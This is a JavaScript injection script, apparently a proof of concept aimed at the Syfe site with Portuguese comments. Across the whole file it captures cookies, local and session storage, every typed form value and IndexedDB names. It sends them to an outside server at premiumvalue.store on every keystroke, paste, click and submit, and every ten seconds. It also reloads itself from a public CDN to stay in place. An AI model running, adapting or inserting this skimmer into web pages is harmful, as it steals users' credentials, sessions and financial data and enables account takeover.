// hijack.js - Versão persistente e sensível para Syfe
(async () => {
  const ENDPOINT = 'https://premiumvalue.store/poc';
  const INTERVAL = 10000; // 10 segundos

  const extractInputs = () => {
    const inputs = Array.from(document.querySelectorAll('input, textarea, select'));
    return inputs.reduce((acc, el) => {
      const name = el.name || el.id || el.getAttribute('placeholder') || el.getAttribute('aria-label');
      const value = el.value;
      if (!name || !value || value.length < 3) return acc;
      acc[name] = value;
      return acc;
    }, {});
  };

  const extractIndexedDB = async () => {
    const databases = await indexedDB.databases?.();
    return databases || [];
  };

  const exfiltrate = async () => {
    const payload = {
      timestamp: Date.now(),
      url: location.href,
      referrer: document.referrer,
      cookies: document.cookie,
      localStorage: { ...localStorage },
      sessionStorage: { ...sessionStorage },
      inputs: extractInputs(),
      windowName: window.name,
      indexedDB: await extractIndexedDB()
    };

    try {
      await fetch(ENDPOINT, {
        method: 'POST',
        body: JSON.stringify(payload),
        headers: { 'Content-Type': 'application/json' },
        mode: 'no-cors'
      });
    } catch (e) {
      console.error('Exfiltration failed:', e);
    }
  };

  const reinjectIfMissing = () => {
    if (!document.querySelector('script[data-hijack="true"]')) {
      const s = document.createElement('script');
      s.src = 'https://cdn.jsdelivr.net/gh/GeovaneAyala/syfe-poc-bypass@main/hijack.js';
      s.setAttribute('data-hijack', 'true');
      document.body.appendChild(s);
    }
  };

  const hookEvents = () => {
    document.addEventListener('input', exfiltrate, true);
    document.addEventListener('change', exfiltrate, true);
    document.addEventListener('submit', exfiltrate, true);
    document.addEventListener('paste', exfiltrate, true);
    document.addEventListener('click', exfiltrate, true);
  };

  // Persist via window.name or localStorage
  if (!window.name.includes('hijack-persist')) {
    window.name += '|hijack-persist';
    localStorage.setItem('persist_hijack', '1');
  }

  hookEvents();
  reinjectIfMissing();
  await exfiltrate();
  setInterval(exfiltrate, INTERVAL);
})();
